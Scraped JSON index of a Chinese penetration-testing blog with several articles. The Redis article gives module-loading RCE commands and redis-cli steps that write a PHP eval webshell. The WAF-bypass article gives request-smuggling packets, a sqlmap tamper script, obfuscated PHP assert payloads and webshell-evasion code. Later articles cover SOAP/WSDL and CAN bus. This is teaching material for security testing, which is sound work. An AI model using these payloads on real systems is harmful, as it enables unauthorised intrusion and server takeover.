生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。 123git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandcd RedisModules-ExecuteCommand/make 攻击端执行 1234567# python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.sogit clone https://github.com/Ridter/redis-rce.gitcd redis-rce/cp ../RedisModules-ExecuteCommand/src/module.so ./pip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so 执行命令 1system.exec &#x27;whoami&#x27; 参考： https://www.cnblogs.com/xiaozi/p/13089906.html 低权限写入webshell 流程： 123456789root@kali:~# redis-cli -h 192.168.223.132192.168.223.132:6379&gt; config set dir /var/www/html/OK192.168.223.132:6379&gt; config set dbfilename shell.phpOK192.168.223.132:6379&gt; set x &quot;&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;&quot;OK192.168.223.132:6379&gt; saveOK 防御 绑定需要访问数据库IP，将127.0.0.1修改为需要访问该数据库的IP 修改帐号密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。 低权限运行Redis 禁止使用帐号密码登录 PostgreSql PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。 提权利用的是一下漏洞。流程为：连接-利用漏洞-执行-提权。 判断权限去应用以下漏洞：一般名字为PostgreSql的用户就是高权限 CVE-2018-1058 PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。（低权限用户用这个） CVE-2019-9193 PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。（高权限提权） 其他权限提升 服务类 FTP RDP SSH 第三方接口 支付 邮件 其他资源 复现注意 搭建数据库后要看防火墙是否把端口给拦截了，是的话重新开启 大马编写 https://blog.csdn.net/qq_53079406/article/details/125038306 思维导图","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"渗透测试需要注意的点","slug":"渗透测试需要注意的点","date":"2023-06-14T01:08:03.000Z","updated":"2023-06-14T01:08:03.000Z","comments":true,"path":"articles/2023/06/14/渗透测试需要注意的点/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/","excerpt":"","text":"前言 首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。 储存，数据库，网站程序等服务器高度分离 实现现代化前端技术， 如三大框架， html5新api， websocket 基于虚拟化技术的服务部署 使用现代后端框架，如ssm，think5，gin，django 外部服务高度集成 多种客户端，包括Android，Ios，windows 篇幅有限， 不再列举，但相信读者应该能理解笔者的意思。 不属于现代化网站最典型的例子就是 下载cms，安装lnmp，直接安装网站程序。现在渗透教程基本都是基于不属于现代化网站的假设。 参考：https://blue-bird1.github.io/posts/newsitethink/ CDN/反向代理 使用了CDN将会隐藏真实IP， 导致常规端口扫描，弱口令扫描全部失效。但可以通过寻找真实ip来解决。反向代理则无解， 甚至可能只把代理服务器暴露于公网。敏感服务全在内网 对绕过CDN这个问题， 已经有了一定的研究。有了安全工具， 如fuckcdn 数据分离 上传文件服务器分离，将导致上传webshell技术失效， 很显然文件服务器是不可能执行webshell的。 上传危害最多只能达到上传html websocket 之所以专门把websocket作为一点， 是因为感觉websocket属于盲区， burp，浏览器均不支持websocket的渗透测试。 新的h5 api html5提供了新的api，但是这方面的安全问题还没有被开发人员重视。这个可以从hackone平台上的漏洞报告看出。例如DOM Based XSS in www。hackerone。com via PostMessage 。 postmessage这类api的输入是不可控的，如果不进行控制， 就是安全问题。 前后端分离 使用三大框架(vue，react， angular)的前端， 对后端进行分离。 也就是不再将url参数直接渲染到html，而通过JavaScript操作。反射行xss全部失效，常规储存xss在框架的安全性下也变得渺茫。JavaScript操作带来的xss反而变为主流。这也对渗透测试人员阅读JavaScript代码带来了挑战，也带来了部分好处，由于在前端操作，后端暴露的接口将会更多。 后端框架 应用了框架后，简单注入全部失效，csrf部分失效， id=x这种低级注入消失。出现注入的点趋向二次注入， 编码注入。 sqlmap是不提供原生支持的，所以一般都没用了，只适合找老漏洞。 外部服务接入 对某些功能不自行进行开发，使用其他公司的服务。这部分功能的安全性取决与该公司的安全水平， 不过真挖出漏洞就属于通用0day了。由于对接入服务的理解，接入处反而容易出现问题， 比如未预料的异常。 接入开发: ???，这个问题你怎么不在服务上处理。 服务开发: ???，这个你怎么不在接入处处理 多服务端 提供了多平台客户端， 这就对渗透测试多平台渗透能力发出了挑战。不但要会web，还要会安卓/ios渗透测试， 反编译(客户端总是会有一些未公开的api)。甚至还有IOT。 风控 好的风控系统基本阻止了邮箱/短信轰炸。对需要爆破的漏洞也降低了危害。 Xass Sass， Pass，Iass等各种服务公司不断涌现， 可能出现刚拿下shell，想内网渗透，发现实际上服务是在某Sass上。或者发现服务api是在Fass上的，根本没有服务器。这涉及到云安全。 参考：https://code84.com/837800.html 虚拟化 docker提供了优秀的服务分离，就算拿到了shell，也只是拿到了容器的shell。 容器虚拟化不一定安全，但是现在对这方面的研究还不是很多， 完全没有对绕过UAC的研究多。 对安全教程的思考 现在一些安全教程还是停留在旧时代， ' and 1=1，&lt;/x&gt;&lt;script&gt;alert(1)&lt;/script&gt;固然是基础，挖掘思路也很重要。但是随着技术的发展， 渗透和开发技术也会走的更近， 新开发技术的爆发式增长，不可能像列中间件漏洞一样全部写出它们的渗透技术。就算有人写出来，等写出来黄花菜都凉了。安全教程应该更强调编程， 而不是培养只会用扫描器的驻场工程师。 对安全工具的思考 扫描器 随着技术的扩散，老式扫描器未来会面临失效。不支持浏览器模拟，只会抓a标签的扫描器， 对前后端分离无能为力。 基于流量和基于爬虫的扫描器会合并， 走向模拟获取流量进行扫描的模式对app的扫描器目前不支持对web的渗透测试。 人工智能 人工智能火热，各路安全公司都号称使用了AI技术(实际上怎么样就不知道了)。 除了使用AI技术对AI进行对抗， AI扫描器也在发展中。 这部分知识，我推荐兜哥的AI安全三部曲。 可以重复的渗透测试动作，AI都可以模拟。随着发展，只会重复的渗透人员会面临淘汰。也能让安全人员拿出精力进行安全研究，而不是重复性的测试。 尾言 现在正是承前启后的时代，旧的开发技术未被淘汰，新的开发技术正在发展， 谁会在这个时代引领潮流， 或是被淘汰。让我们拭目以待吧","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"https://j3f5.github.io/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"WAF绕过-一般性绕过总结","slug":"WAF绕过-一般性绕过总结","date":"2023-06-12T07:03:07.000Z","updated":"2023-06-14T07:03:07.000Z","comments":true,"path":"articles/2023/06/12/WAF绕过-一般性绕过总结/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"","text":"基础绕过 基础绕过一般是针对于payload的绕过，之前迪哥也在各个章节多少有提到过，这里做一些总结。参考文献有： https://blog.gm7.org/个人知识库/01.渗透测试/07.WAF绕过/01.WAF绕过通用思路.html https://www.anquanke.com/post/id/212272#h2-11 双写、大小写 略 编码 这里要说一下： 对于get方法来说，都是把数据串联在请求的url后面作为参数，然后对后面的参数进行URL-ENCODE编码。 URL encode的过程就是把部分url作为字符，按照某种编码方式（如：utf-8，gbk等）编码成二进制的字节码，然后每个字节用一个包含3个字符的字 符串 “%xy” 表示，其中xy为该字节的两位十六进制表示形式。 对于post方法来说，他将使用&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=字符集（GBK，utf-8等）&quot;/&gt;中的charset字段定义编码。有四种方式： 字段 说明 application/x-www-form-urlencoded 在发送前编码所有字符（默认） multipart/form-data 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。 application/json text/plain 空格转换为 “+” 加号，但不对特殊字符编码。 text/html html编码 所以编码可以分为： URL编码 HTML编码 Base64编码 Unicode编码 十六进制编码 其他后端会解析的编码 注释 垃圾字符 一般waf只会拦截一点点，只要超过这个长度就不检测，所以可以把Payload写在后面 分块传输 严格来说分块传输并不是一种编码解码机制，但是从实际效果来看，大家都把分块传输当成是一种特殊的编码解码办法。里面的很多技巧和编码解码有相似之处。分块传输，又称为Http Chunked。分块传输本身适用于解决大文件传输的问题，属于http标准的协议功能，所有的WEB服务器均支持分块传输。在绕过WAF的测试中，分块传输也是属于编码/解码的一种。只需要设置如下头即可。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。 burp插件：https://github.com/c0ny1/chunked-coding-converter.git 1Transfer-Encoding: chunked HTTP HTTP 0.9 HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果 HTTPS与HTTP http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 参数污染 在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。注意每种服务器获取到的参数的位置不同，例如apache是最后一个。 注入样例：bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3。apache获取到最后一个，而waf服务器（tomcat）只解析重复参数里面的前者。 Web环境 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) last JSP/Tomcat Request.getParameter(“par”) first Perl(CGI)/Apache Param(“par”) first Python/Apache getvalue(“par”) [“first”,“last”] ASP.NET/IIS Request.QueryString(“par”) first,last Pipeline（keep-alive） http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止 我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf 记得把brupsuite自动更新Content-Length的勾去掉 参考数据包： 12345678910111213141516171819POST / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 3a=1GET / HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: close HTTP charset 利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。 需要了解上面的编码绕过相关知识，针对的是post。 Waf特性 云waf 写host地址，直达真正的地址，不经过云转发即可！ 白名单绕过 一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 Content-Type绕过 一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 一些WAF检测到HEAD等等请求后，会直接拦截（因为不像是人的操作） 解析兼容性 这个之前说过，举个例子：如果waf是检测filename=&quot;&quot;的最后一个&quot;，那么，只要我们这样构造：filename=&quot;sss&quot;s.php他就不拦截了，会保存为s.php。 容器特性 IIS+ASP %会被自动去掉 unicode会自动解码 Tomcat 路径穿越 1/path1/path2/ == ;/path1;foo/path2;bar/; 信息搜集绕过waf 一般对网站进行扫描的时候，都会产生大量数据包，一些网站对将之识别为CC攻击等等。 如果遇到这种防护，分WAF的类别，例如有阿里云的网站服务器适配、有宝塔等等软件waf等。一般都自己写代码来实现绕过。 那么我们有如下绕过方式 模拟用户请求 即使用常用的UA和常用的请求方式：GET/POST等。 延时 设置延时，每3秒扫一条（阿里云的限制） 模拟爬虫 一般waf为了保证网站被收录，不会拦截爬虫。所以在UA上设置成爬虫即可 1234567891011121314151617181920212223242526百度爬虫，第二条为百度图片爬虫Baiduspider+(+http://www.baidu.com/search/spider.htm&quot;)Baiduspider-imagegoogle爬虫，最后一条为google图片搜索爬虫Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)Googlebot/2.1 (+http://www.googlebot.com/bot.html)Googlebot/2.1 (+http://www.google.com/bot.html)Googlebot-Image/1.0即刻搜索爬虫Mozilla/5.0 (compatible; JikeSpider; +http://shoulu.jike.com/spider.html)雅虎爬虫（分别是雅虎中国和美国总部的爬虫）Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html&quot;)Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp&quot;)新浪爱问爬虫iaskspider/2.0(+http://iask.com/help/help_index.html&quot;)Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)搜狗爬虫,第三条为搜狗图片爬虫Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)搜搜爬虫Sosospider+(+http://help.soso.com/webspider.htm)网易有道爬虫Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )MSN爬虫msnbot/1.0 (+http://search.msn.com/msnbot.htm) 代理池 因为延时很慢，所以有代理池，使用不同的IP请求，这些IP会转发包回你的IP。免费的代理池很有可能被识别出来，最好用付费的。例如：快代理。当然，也有免费的：proxy pool 代理代码： 1234567891011121314151617181920212223242526272829303132333435363738394041#搜索引擎爬虫模拟及模拟真实用户import requestsimport timeheaders=&#123;&#x27;Connection&#x27;: &#x27;keep-alive&#x27;,&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;,&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)&#x27;,&#x27;Sec-Fetch-Dest&#x27;: &#x27;document&#x27;,&#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,&#x27;Sec-Fetch-Site&#x27;: &#x27;none&#x27;,&#x27;Sec-Fetch-Mode&#x27;: &#x27;navigate&#x27;,&#x27;Sec-Fetch-User&#x27;: &#x27;?1&#x27;,&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, br&#x27;,&#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;,&#x27;Cookie&#x27;: &#x27;xxx&#x27;,#根据当前访问 cookie&#125;for paths in open(&#x27;php_b.txt&#x27;,encoding=&#x27;utf-8&#x27;): url=&#x27;http://192.168.0.103:8081/&#x27; paths=paths.replace(&#x27;\\n&#x27;,&#x27;&#x27;) urls=url+paths #如需测试加代理，或加入代理池需加代理 proxy = &#123; &#x27;http&#x27;: &#x27;127.0.0.1:7777&#x27; &#125; try: code=requests.get(urls,headers=headers,verify=False).status_code print(urls+&#x27;|&#x27;+str(code)) if code==200 or code==403: print(urls+&#x27;|&#x27;+str(code)) except Exception as err: print(&#x27;connecting error&#x27;) #time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度） 白名单机制（上面有提到） 漏洞发现绕过waf 其实思路和上面一样，多了一些就是对流量特征的更改。现在说一下联动： awvs+burp+xray 漏扫 Payload 绕过-延时，被动 awvs设置 慢扫 UA改为爬虫UA 设置转发 Burp 设置代理转发 XRAY 监听 因为AWVS有慢速扫描还好，如果没有的话，就需要BURP来控制速度（可以安装一个按键精灵，哈哈哈哈），这样才能控制XRAY。 因为每个工具识别漏洞的Payload不一样，所以才可能不会被识别，所以才有联动这一说法。如果存在一款可以自己改Payload特征啥（有HTTP头的更改啥的）的就好了，而且需要控制速度，这通常需要我们自己写。 漏洞利用 这里将不讨论常用的绕过，重点在于工具的绕过以及工具的流量特征。 sql注入（sqlmap特征） 【特征1】攻击产生的流量非常多，一般都会触发cc攻击的防御机制，所以一般会使用--delay或者代理池 【特征2】默认参数，产生的流量如下，其ua头有sqlmap字样，很容易辨认，所以一般会使用参数--random-agent 1234567GET /pikachu/vul/sqli/sqli_str.php?name=admin&amp;submit=查询 HTTP/1.1CACHE-CONTROL: no-cacheCONNECTION: closeUSER-AGENT: sqlmap/1.5.8#stable (http://sqlmap.org)ACCEPT: */*HOST: 192.168.68.78ACCEPT-ENCODING: gzip,deflate 【特征3】 xss测试语句、随机数的位数 【特征4】注入流程/句子比较固定 综合上述，我们可以自己写tamper来替代一些注入句子，更改特征 12345678910111213141516171819#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)See the file &#x27;LICENSE&#x27; for copying permission&quot;&quot;&quot;from lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef tamper(payload,**kwargs): retVal =&quot;&quot; if payload: payload = payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;) payload = payload.replace(&quot;select&quot;,&quot;/*!4457select*/&quot;) payload = payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;) payload = payload.replace(&quot; &quot;,&quot;%23a%0a&quot;) payload = payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;) return payload 所以，最终的payload为： 1python sqlmap.py -u &quot;***&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent 总结一下绕过： 代理：绕过传cc tamper：注入规则 user-agent：修改ua，防止匹配到工具的指纹 XSS（XSStrike绕过） 利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc。跑就完事儿了！ 12xsstrike.py -u &quot;目标网址&quot; --timeout x 延时xsstrike.py -u &quot;目标网址&quot; --proxy 代理地址 RCE 可逆算法绕过 base64：很可能base64_decode会被拦截（如果你传入的代码自带base64解码，那当然万事胜意啦，如果没有，那么就只能你传入一个解码函数了）。 1txt=base64_decode(cGhwaW5mbygp) url 编码 进制编码（十六进制）等：很可能会拦截hex等函数，理由跟base64差不多。 1txt=$hex=&#x27;706870696E666F2829&#x27;;assert(pack(&quot;H*&quot;,$hex));submit=%E6%8F%90%E4%BA%A4 替换绕过 也就是将一个字符设置为空，那么这个字符可以加载到任何位置 1txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4 拼接 1txt=$X=&#x27;asse&#x27;;$xx=&#x27;rt&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4ce 更改传参方式 实际上就是post的data部分传入GET请求，然后再在get请求URL上填入参数 1234[URL GET]http:/127.0.0.1/pikachu/vul/rce/rce_eval.php?x=rt[POST DATA]txt=$x=&#x27;asse&#x27;;$xx=$GET[&#x27;x&#x27;];$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);$xxx($y);&amp;submit=%E6%8F%90%E4%BA%A4 文件包含 ：没什么好说的就这几种 …\\ …/ …\\等 权限控制 一个文件上传到网站之后，杀毒软件会对这个文件进行扫描和监控后续敏感操作。 代码级别的绕过，需要识别各种后门的代码是否是恶意代码 操作级别的绕过，对后门的操作合理化 免杀思路 变量覆盖 例如：&lt;?php assert($_POST['chopper'])?&gt; 变成： 12345&lt;?php$a = $_GET[&#x27;x&#x27;];$$a = $_GET[&#x27;y&#x27;];$b($_POST[&#x27;z&#x27;]);?&gt; 传递的参数为： 1234POST /URL/?x=b&amp;y=assert...[data]z=phpinfo() 注： 简单拆分不行，因为waf会进行变量跟踪 出现关键词不行，会直接拦截 如果传入的phpinfo()等操作被拦截，则需要配合编码 编码 12345&lt;?php$a = $_GET[&#x27;x&#x27;];$$a = $_GET[&#x27;y&#x27;];$b(base64_decode($_POST[&#x27;z&#x27;]));?&gt; 传递的参数为： 1234POST /URL/?x=b&amp;y=assert...[data]z=cGhwaW5mbygp 异或操作&amp;&amp;加密混淆 可以使用工具： 网络接口加密（更稳） enphp工具 造轮子 waf基本都有菜刀、蚁剑、冰蝎的指纹，当你使用他们的时候，一些危害行为会被拦截！ 要想不被识别拦截，只能自己造轮子！ 自己写数据包，不会有那些指纹特征，就能实现功能！ 工具 冰蝎、蚁剑、菜刀、哥斯拉 原理以及优缺点 原理：把一些具体执行语句集成化（各种各样在功能语句都帮你写好了），你直接连接执行就可！ 优缺点：菜刀：未更新状态，无插件，单向加密传输。蚁剑：更新状态，有插件，拓展性强，单向加密传输。冰蝎：更新状态，未知插件，偏向于后渗透（MSF），双向加密传输 单向加密传输是什么？我加密数据给服务器，而服务器返回的就没有加密。 流量分析 菜刀：【z0，明文/base64】 eval函数执行 攻击的payload使用base64编码 默认参数z0 对应$_POST [z0]接收到的数据，该参数值是使用 Base64 编码的，所以可以利用 base64 解码可以看到攻击明文 蚁剑：【ini_set，部分明文】 正文解码发现：@ini_set (&quot;display_errors&quot;,&quot;0&quot;);，也使用base64加密payload 参数名大多以 _0x.....=”这种形式（下划线可替换为其他） 后面为加密数据的数据包也可识别为蚁剑的流量特征 冰蝎：【UA头，content-type，数据长度（协商密钥数据等长），返回的全是加密字符】 冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream。还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的 内置很多UA头，相同IP重复请求，但是UA头不一样，则需要注意 哥斯拉（base64 加密）：【响应三次】 发送一段固定代码（payload），http 响应为空 发送一段固定代码（test），执行结果为固定内容 发送一段固定代码（getBacisInfo） 混淆免杀工具 上面有提到一些。 注：蚁剑和菜刀的流量后门基本上是一致的，所以都可以用他的混淆，例如D盾的混淆：as-webshell-venom","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"waf绕过","slug":"waf绕过","permalink":"https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"}]},{"title":"HTTP与开发基础","slug":"HTTP与开发基础","date":"2023-06-12T05:25:20.000Z","updated":"2023-06-12T05:25:20.000Z","comments":true,"path":"articles/2023/06/12/HTTP与开发基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/","excerpt":"","text":"WSDL、SOAP以及WebService 什么是WebService、什么是SOAP以及什么是WSDL 12soap: Simple Object Access Protocol.(简单对象访问协议)wsdl: Web Service Description Language.(Web服务描述语言) 参考：https://zhuanlan.zhihu.com/p/383326629 ，https://blog.csdn.net/dzqxwzoe/article/details/129221428 WebService WebService有着狭义和广义的定义： 广义的来说，WebService就是字面意思：Web+Service，也就是服务(Service)网络(Web)化的意思；它力求的是跨语言和跨平台的、基于Web传输的远程调用能力。 它没有强调远程调用使用什么协议，所以我们可以自由选择，比如SOAP协议或者常见的基于http的json化的数据传输协议。 关于广义的定义更为深入和具体的介绍，可以参看大V阮一峰的这篇博客，就不再过多介绍了，狭义的来说，我们经常谈的WebService是指基于SOAP协议实现的远程服务调用模型； Web service是什么？ - 阮一峰的网络日志www.ruanyifeng.com/blog/2009/08/what_is_web_service.html SOAP SOAP定义了数据交互中如何传递消息的规则； 比如在http中规定了post请求的传参方式，在数据类型不同的情况下可以使用不同的参数方式；其中在form格式下是 key=v&amp;key1=v1，同样SOAP也是定义这些东西的； WSDL 同样的，当我们用http方式去调用一个服务的时候，我们只是知道通用的http协议的传参方式还是不够的，我们仍然需要知道目标服务的接口文档；这就是WSDL，每个服务都有的接口文档。 在http上可能就是我们手写的一个wiki文档，而在SOAP中就是一个用WSDL规范编写的WSDL文档，每个服务是有能力自动生成这个文档的，其中WSDL规范了这个文档该怎么写； 那么我们一般如何阅读WSDL文件呢？——WSDL文档都是从下往上阅读的。先看最底下的service标签，查看其中port标签的binding属性值，然后通过值查找上面的binding标签 定义 123456789101112131415161718192021&lt;definitions&gt; &lt;types&gt; definition of types........ 数据类型定义的容器，它使用某种类型系统(一般地使用XML Schema中的类型系统) &lt;/types&gt; &lt;message&gt; definition of a message.... 通信消息的数据结构的抽象类型化定义。使用Types所定义的类型来定义整个消息的数据结构。 &lt;/message&gt; &lt;portType&gt; definition of a port....... 对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持。 &lt;/portType&gt; &lt;binding&gt; definition of a binding.... 特定端口类型的具体协议和数据格式规范的绑定。 &lt;/binding&gt; &lt;service&gt; 相关服务访问点的集合。 &lt;/servie&gt;&lt;/definitions&gt; 举个小李子 综上所述 综上所述 SOAP可以类比http协议：定义了方式 WSDL可以类比一个http服务的接口文档； 在了解了WebService、SOAP以及WSDL相关概念以后, 接着我们的目标便是用ksoap2来发起网络请求获取数据了。 举个小例子： 123456789101112&lt;wsdl:binding name=&quot;WeatherWebServiceSoap&quot; type=&quot;tns:WeatherWebServiceSoap&quot;&gt; &lt;soap:binding transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt; &lt;wsdl:operation name=&quot;getWeatherbyCityName&quot;&gt; &lt;soap:operation soapAction=&quot;http://WebXml.com.cn/getWeatherbyCityName&quot; style=&quot;document&quot;/&gt; &lt;wsdl:input&gt; &lt;soap:body use=&quot;literal&quot;/&gt; &lt;/wsdl:input&gt; &lt;wsdl:output&gt; &lt;soap:body use=&quot;literal&quot;/&gt; &lt;/wsdl:output&gt; &lt;/wsdl:operation&gt; &lt;/wsdl:binding&gt;","categories":[{"name":"开发基础","slug":"开发基础","permalink":"https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"车联网基础-协议","slug":"车联网基础-协议","date":"2023-06-12T02:19:22.000Z","updated":"2023-06-15T02:19:22.000Z","comments":true,"path":"articles/2023/06/12/车联网基础-协议/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"CAN协议 总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其中之一，它常常配合着OBD-II连接器出现。 CAN协议有高速车线和低速车线 高速（CANH）：RPM控制 中低速（CANL）：门把所、空调 这意味着当信号进来时，CAN提高一条线上的电压，并降低另一条线上的电压。这种差分信号用于必须容错噪声的环境中，例如汽车系统和制造业。当一个位在CAN总线上传输时，信号将同时广播高1V和低1V。传感器和ECU有一个收发器，检查以确保两个信号都被触发;如果不是，收发器将数据包作为噪声拒绝。 